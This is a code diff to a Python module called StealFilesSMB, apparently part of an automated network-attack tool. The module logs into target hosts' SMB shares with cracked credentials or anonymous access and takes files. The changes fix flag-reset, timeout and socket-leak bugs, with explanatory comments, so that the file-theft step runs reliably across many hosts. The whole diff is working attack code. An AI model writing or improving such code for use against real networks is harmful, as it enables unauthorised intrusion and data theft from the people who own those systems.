@@ -5,7 +5,7 @@ from threading import Timer
 import time
 from smb.SMBConnection import SMBConnection
 from smb.base import SharedFile
-from shared import SharedData
+from shared import SharedData, settle_for_display
 from logger import Logger
 
 # Configure the logger
@@ -100,9 +100,16 @@ class StealFilesSMB:
         try:
             if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                 self.shared_data.bjornorch_status = "StealFilesSMB"
+                # Per-run state, reset here rather than only in __init__. These objects are
+                # long-lived singletons built once by orchestrator.load_action, so the flags
+                # latched: once the 240s timer fired for ANY host, stop_execution stayed True
+                # and every later steal on every host broke out immediately and returned
+                # 'failed' — permanently, until the service restarted. Conversely a single
+                # success left *_connected True and disarmed the timeout for good.
+                self.stop_execution = False
+                self.smb_connected = False
                 logger.info(f"Stealing files from {ip}:{port}...")
-                # Wait a bit because it's too fast to see the status change
-                time.sleep(5)
+                settle_for_display(self.shared_data)  # let the panel show this action's name
                 # Get SMB credentials from the cracked passwords file
                 smbfile = self.shared_data.smbfile
                 credentials = {}
@@ -132,24 +139,46 @@ class StealFilesSMB:
                         logger.info(f"Anonymous access to {ip} failed: {e}")
                         return None, None
 
-                if not credentials and not try_anonymous_access():
-                    logger.error(f"No valid credentials found for {ip}. Skipping...")
-                    return 'failed'
+                # try_anonymous_access() returns a 2-tuple — (conn, shares) or (None, None) — and a
+                # tuple is always truthy, so `not try_anonymous_access()` was always False and this
+                # guard could never fire. It also opened a real SMB connection and threw the handle
+                # away (a leaked socket for the process lifetime), then connected a second time
+                # below. Probe once, keep the result, and test what it actually returned.
+                anon_conn, anon_shares = (None, None)
+                if not credentials:
+                    anon_conn, anon_shares = try_anonymous_access()
+                    if not anon_conn:
+                        logger.error(f"No valid credentials and no anonymous access for {ip}. Skipping...")
+                        return 'failed'
+
+                # Token this run. timer.cancel() is only reached on the success path, so a failed
+                # steal leaves a live 240s timer behind; without this it would fire midway
+                # through a LATER host's steal and abort it by setting stop_execution.
+                run_token = object()
+                self._run_token = run_token
 
                 def timeout():
                     """
                     Timeout function to stop the execution if no SMB connection is established.
                     """
+                    if getattr(self, '_run_token', None) is not run_token:
+                        return  # a later execute() owns the flags now
                     if not self.smb_connected:
                         logger.error(f"No SMB connection established within 4 minutes for {ip}. Marking as failed.")
                         self.stop_execution = True
 
                 timer = Timer(240, timeout)  # 4 minutes timeout
+                timer.daemon = True  # never hold up shutdown waiting for a 4-minute timer
                 timer.start()
 
-                # Attempt anonymous access first
+                # Reuse the probe above when it already ran; only connect again if it did not.
                 success = False
-                conn, shares = try_anonymous_access()
+                conn, shares = (anon_conn, anon_shares) if anon_conn else try_anonymous_access()
+                # Close it even when there is nothing to list. conn.close() used to live inside the
+                # `if conn and shares:` body, so a host that connected but exposed no listable
+                # shares leaked the socket for the lifetime of the process.
+                if conn and not shares:
+                    conn.close()
                 if conn and shares:
                     for share in shares:
                         if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
